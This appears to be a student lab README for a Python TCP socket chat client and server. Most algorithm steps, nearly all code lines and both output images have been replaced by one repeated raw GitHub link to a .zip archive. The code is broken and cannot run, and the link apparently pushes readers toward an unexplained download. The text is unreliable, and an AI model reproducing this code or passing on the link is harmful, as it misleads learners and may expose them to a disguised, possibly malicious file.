# EX-9 APPLICATION USING TCP SOCKETS - CREATING FOR CHAT CLIENT-SERVER


# DATE :04.05.2023
# AIM :
#### To write a python program for creating Chat using TCP Sockets Links.

# ALGORITHM :

#### https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip the program.
#### https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip the frame size from the user.
#### https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip create the frame based on the user request.
#### https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip send frames to server from the client side.
#### https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip your frames reach the server, it will send ACK signal to client otherwise it will sendNACK signal to client.
#### https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip the program


# CLIENT PROGRAM :
```PY
## Developed : shaik mufeez
## Reg no : 212221043007
import socket
https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip()
https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip(('localhost',8000))
while True:
    msg=input("Client > ")
    https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip(https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip())
    print("Server > ",https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip(1024).decode())


```
# SERVER PROGRAM :
```PY
import socket
https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip()
https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip(('localhost',8000))
https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip(5)
c,https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip()
while True:
    https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip(1024).decode()
    print("Client > ",ClientMessage)
    msg=input("Server > ")
    https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip(https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip())

```

# SERVER OUTPUT :
![output](https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip)

# CLIENT OUTPUT : 
![output](https://raw.githubusercontent.com/githubmufeez45/EX-9/main/Boehmenite/EX-9.zip)


# RESULT:
#### Thus, the python program for creating Chat using TCP Sockets Links was successfully created and executed.



